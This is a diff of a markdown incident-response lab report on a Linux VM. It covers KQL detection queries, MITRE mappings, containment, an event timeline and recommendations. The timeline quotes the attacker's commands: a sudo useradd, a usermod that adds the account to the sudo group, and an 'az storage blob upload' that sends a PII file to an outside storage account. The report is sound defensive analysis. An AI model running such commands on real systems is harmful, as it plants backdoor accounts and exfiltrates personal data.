@@ -26,9 +26,6 @@ Set the query logic
 
 ## Detection & Analysis
 
-
-## Detection and Analysis Phase
-
 The **Detection and Analysis** phase focuses on identifying potential security incidents and determining their scope, impact, and severity. This phase begins when an alert, event, or report indicates suspicious or malicious activity.
 
 During this phase, organizations:
@@ -42,9 +39,15 @@ During this phase, organizations:
 
 Effective detection and analysis enable rapid decision-making, minimize false positives, and ensure that confirmed incidents are escalated promptly to the **Containment, Eradication, and Recovery** phase.
 
+#### Query 1
 
+Used this query, which detects recent privileged group-membership modification activity on a specific Linux system, which can indicate privilege escalation or persistence.
 
-Using the scheduled rule using fewer hours 
+This query is useful. Adding a user to privileged groups (e.g., sudo, wheel, adm, docker) is a common technique used for:
+  - Privilege escalation
+  - Persistence via valid accounts
+  - Post-compromise access maintenance
+  - Insider misuse
 
 ```
 DeviceProcessEvents
@@ -55,11 +58,24 @@ DeviceProcessEvents
 | project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessAccountName
 
 ```
+Results:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr13.png)
 
+MITRE ATT&CK mapping
+  - T1098 – Account Manipulation
+  - T1078 – Valid Accounts
+  - T1059.004 – Command and Scripting Interpreter: Unix Shell
 
-Another query showed the user created
+#### Query 2
+
+Used a query that looks for recent privileged user-creation activity on the host, which is a common persistence or privilege-escalation indicator.
+
+This query is useful for detecting:
+- Unauthorized account creation
+- Persistence techniques
+- Post-compromise privilege abuse
+- Insider threat or lateral movement
 
 ```
 DeviceProcessEvents
@@ -70,26 +86,293 @@ DeviceProcessEvents
 | project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessAccountName
 
 ```
+Result: 
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr12.png)
 
-Further query for analysis
+MITRE ATT&CK mappping:
+  - T1136 – Create Account
+  - T1059 – Command and Scripting Interpreter
 
-![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr14.png)
 
+#### Query 3
 
-![image alt](https://github.com/Muts256/SNC-Public/blob/94094b1615b895bf31c4717583f2e489526564a0/Images/Linux-Privilege-Escalation/Pr27.png)
+Used a query to identify recent shell script creation activity by a specific user of a particular host, which can indicate persistence or malicious script staging.
 
-files created
+This activity may indicate:
+  - Script-based persistence mechanisms
+  - Post-exploitation staging of malicious payloads
+  - Abuse of legitimate shell access
+  - Insider or compromised account activity
+
+```
+DeviceFileEvents
+| where DeviceName contains "MM-Priv"
+| where Timestamp > ago(8h)
+| where ActionType == "FileCreated"
+| where FileName contains ".sh"
+| where InitiatingProcessAccountName == "labuser1"
+| project Timestamp, FolderPath, FileName, InitiatingProcessCommandLine
+```
+Result: 
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr15.png)
 
+MITRE ATT&CK mapping
+  - T1059.004 – Command and Scripting Interpreter: Unix Shell
+  - T1105 – Ingress Tool Transfer (if scripts are staged for later execution)
+  - T1547 – Boot or Logon Autostart Execution (if used for persistence)
 
-Check for any remote connection
+#### Query 4
+
+Used this query that looks for recent file upload–related process activity on a specific device, which can indicate data exfiltration or tool transfer.
+
+This query can help identify:
+  - Data exfiltration attempts
+  - Staging or transfer of stolen data
+  - Malware using upload functions
+
+```
+DeviceProcessEvents
+| where DeviceName contains "MM-Priv"
+| where Timestamp > ago(6h)
+| where InitiatingProcessCommandLine contains "upload"
+| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessAccountName
+```
+Result:
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr14.png)
+
+MITRE ATT&CK mapping:
+  - T1041 – Exfiltration Over C2 Channel
+  - T1567 – Exfiltration Over Web Service
+  - T1105 – Ingress Tool Transfer (if uploading tools instead of data)
+
+#### Query 5
+
+Used this query that identifies recent network activity related to upload actions initiated by a specific user on a specific device, which can indicate data exfiltration or unauthorized data transfer.
+This query can help identify:
+  - Potential data exfiltration attempts
+  - Unauthorized uploads to external services
+  - Abuse of legitimate tools for covert data transfer
+  - Post-compromise activity by a compromised user account
+
+```
+DeviceNetworkEvents
+| where DeviceName contains "MM-Priv"
+| where Timestamp > ago(8h)
+| where InitiatingProcessCommandLine contains "upload"
+| where InitiatingProcessAccountName == "labuser1"
+| project Timestamp, DeviceName, InitiatingProcessCommandLine, InitiatingProcessAccountName
+```
+Result:
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/94094b1615b895bf31c4717583f2e489526564a0/Images/Linux-Privilege-Escalation/Pr27.png)
+
+MITRE ATT&CK mapping
+  - T1041 – Exfiltration Over C2 Channel
+  - T1567 – Exfiltration Over Web Service
+  - T1105 – Ingress Tool Transfer
+
+#### Query 6
+
+Used this query that identifies recent successful logon activity on a specific device, helping detect potential unauthorized or suspicious access.
+
+This query helps in identifying:
+  - Unauthorized or unexpected access
+  - Compromised credentials being used successfully
+  - Lateral movement into privileged systems
+  - Persistence using valid accounts
+
+```
+DeviceLogonEvents
+| where DeviceName contains "MM-Priv"
+| where Timestamp > ago(6h)
+| where ActionType == "LogonSuccess"
+| project Timestamp, LogonType,RemoteIP, AccountName, InitiatingProcessAccountName
+
+```
+Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr10.png)
 
+MITRE ATT&CK mapping:
+  - T1078 – Valid Accounts
+  - T1021 – Remote Services (if remote logons are observed)
+
+#### Query 7
+Used this query to identify recent failed logon attempts on a specific device, which can indicate brute-force activity, credential misuse, or reconnaissance.
+
+This query is useful for detecting:
+  - Brute-force or password-spray attacks
+  - Credential stuffing attempts
+  - Reconnaissance against privileged accounts
+  - Early stages of lateral movement
+
+```
+DeviceLogonEvents
+| where DeviceName contains "MM-Priv"
+| where Timestamp > ago(6h)
+| where ActionType == "LogonFailed"
+| project Timestamp, LogonType,RemoteIP, AccountName, InitiatingProcessAccountName
+
+```
+Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/aa6eef18578980df6f00d33a7ecb249daa32afd0/Images/Linux-Privilege-Escalation/Pr11.png)
 
+MITRE ATT&CK mapping
+  - T1110 – Brute Force
+  - T1078 – Valid Accounts (attempted misuse)
+  - T1021 – Remote Services (if remote logons are involved)
 
+---
+
+### Containment, Eradication, and Recovery
+
+This phase focuses on stopping the incident, removing the threat, and restoring normal operations while minimising business impact.
+
+#### 1. Containment
+
+The immediate goal is to limit the spread and impact of the incident.
+
+Typical actions include:
+  - Isolating affected systems (network segmentation, host isolation)
+  - Disabling compromised user accounts
+  - Blocking malicious IPs, domains, or hashes
+  - Applying temporary mitigations or firewall rules
+  - Preserving evidence for forensic analysis
+
+Containment strategies may be:
+  - Short-term containment (quick actions to stop damage)
+  - Long-term containment (more stable fixes while preparing eradication)
+
+The Device (MM-Priv-Escalation-vm) was isolated using MDE, and the user account labuser1 was disabled as well.
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/79c2615d4ac04444c8a2d1526d5ac1666627fb0c/Images/Linux-Privilege-Escalation/Pr28.png)
+
+#### 2. Eradication
+
+Once the threat is contained, the focus shifts to completely removing the root cause.
+
+Typical actions include:
+  - Removing malware, backdoors, and persistence mechanisms
+  - Deleting unauthorized accounts or scripts
+  - Closing exploited vulnerabilities
+  - Applying security patches and configuration hardening
+  - Resetting compromised credentials
+
+The goal is to ensure the attacker no longer has access.
+
+User account *charlie_benson*, which was created on the system and identified in Query 2 in the Detection phase, was removed, and labuser1 was asked to reset the password
+
+#### 3. Recovery
+
+This stage restores systems to normal, trusted operation.
+
+Typical actions include:
+  - Restoring systems from clean backups
+  - Reintroducing systems into production
+  - Monitoring systems closely for signs of reinfection
+  - Validating security controls and logging
+  - Confirming business services are functioning correctly
+    
+Recovery emphasizes confidence and stability, not just uptime
+
+---
+
+### Post-Incident Activity
+
+This phase focuses on learning from the incident and improving the organization’s overall security posture to prevent recurrence.
+
+#### Purpose of the Post-Incident Activity phase
+
+Once systems are fully recovered, the goal is to:
+  - Understand what happened
+  - Identify what worked and what didn’t
+  - Improve people, process, and technology
+
+This ensures each incident strengthens future detection and response capabilities.
+
+#### Key activities in this phase
+
+##### Lessons learned
+  -Conduct a post-incident review or retrospective
+  - Analyze root causes and attacker techniques
+  - Identify gaps in detection, response, or communication
+  - Evaluate the effectiveness of controls and playbooks
+
+##### Documentation and reporting
+  - Produce a formal incident report
+  - Document timelines, indicators, impact, and actions taken
+  - Record costs, downtime, and business impact
+  - Preserve evidence for compliance or legal requirements
+
+##### Improvements and tuning
+  - Update detection rules, alerts, and SIEM queries
+  - Improve logging, monitoring, and visibility
+  - Refine incident response playbooks and runbooks
+  - Update policies, procedures, and escalation paths
+
+##### Training and awareness
+  - Use findings to improve analyst training
+  - Share insights with SOC, IT, and leadership
+  - Update tabletop and incident response exercises
+
+### Report
+
+| Timestamp | Event Description | Phase / Action Type |
+|-----------|-----------------|------------------|
+| Dec 28, 2025 11:14:03 AM | User `charlie_benson` was added to the system using the command `sudo useradd charlie_benson`. | Detection & Analysis (Privilege Escalation / Account Creation) |
+| Dec 28, 2025 11:33:28 AM | `secret_script.sh` was created using the command `touch secret_script.sh`. | Detection & Analysis (Persistence / Script Staging) |
+| Dec 28, 2025 12:31:03 PM | **User `charlie_benson` was added to the `sudo` group using the command `sudo usermod -aG sudo charlie_benson`.** | **Containment, Eradication & Recovery (Privilege Escalation / Account Manipulation)** |
+| Dec 28, 2025 12:31:03 PM | **Files exfiltrated using bash script: `bash /usr/bin/az storage blob upload --account-name mmprivescalation --account-key ********** --container-name 1-mm-priv-escalalation --file /home/labuser1/.secret_folder/.pii.txt --name pii-download.txt`.** | **Detection & Analysis / Containment (Data Exfiltration)** |
+
+---
+
+### Recommendations
+
+Based on the investigation of the events on the MM-Priv workstation, the following recommendations are suggested to prevent recurrence and improve security posture:
+
+#### 1. Access Controls & Account Management
+- Restrict administrative privileges to only necessary personnel.
+- Enforce least privilege for all users.
+- Implement approval workflows for account creation or privilege escalation.
+
+#### 2. Workstation Security
+- Enable automatic workstation locking after short periods of inactivity.
+- Use privacy filters on monitors to prevent shoulder surfing.
+- Provide user awareness training on not leaving sensitive sessions unattended.
+
+#### 3. Monitoring & Detection Improvements
+- Monitor and alert on:
+  - Execution of `useradd`, `usermod`, and creation of suspicious scripts.
+  - Privilege escalations (e.g., adding users to `sudo` or `admin` groups).
+  - Large file transfers or upload commands.
+- Correlate events in the SIEM to link file creation, privilege escalation, and data exfiltration.
+
+#### 4. Data Protection
+- Encrypt sensitive PII at rest and in transit.
+- Restrict access to sensitive files to authorized users only.
+- Implement Data Loss Prevention (DLP) policies to block unauthorized exfiltration.
+
+#### 5. Incident Response Process
+- Conduct tabletop exercises simulating unattended workstations and insider threats.
+- Update IR playbooks with steps for detecting and responding to physical or local access abuse.
+- Document lessons learned, timelines, and gaps identified.
+
+#### 6. Employee Awareness & Physical Security
+- Train staff to report suspicious activity immediately.
+- Implement physical security measures such as badge-controlled workstation access in sensitive areas.
+
+
+## Lessons Learned
+
+Performing this lab highlighted several key lessons for improving security posture and incident response:
+
+- Leaving workstations unattended can result in **insider threats or accidental data exposure**.  
+- Privilege escalation using commands like `usermod` or `sudo` is detectable with proper monitoring, but **timely alerts are essential**.  
+- Correlating **process creation, file creation, and network events** in a SIEM helps detect suspicious activity and potential data exfiltration faster.  
+- Implementing **least privilege access** and **Data Loss Prevention (DLP) controls** can prevent unauthorized access and exfiltration.  
+- Regular **incident response drills, tabletop exercises, and employee awareness training** improve the organization’s ability to respond effectively to real incidents.  
+- Proper logging and **audit trails** are crucial for investigating incidents and providing accountability.  
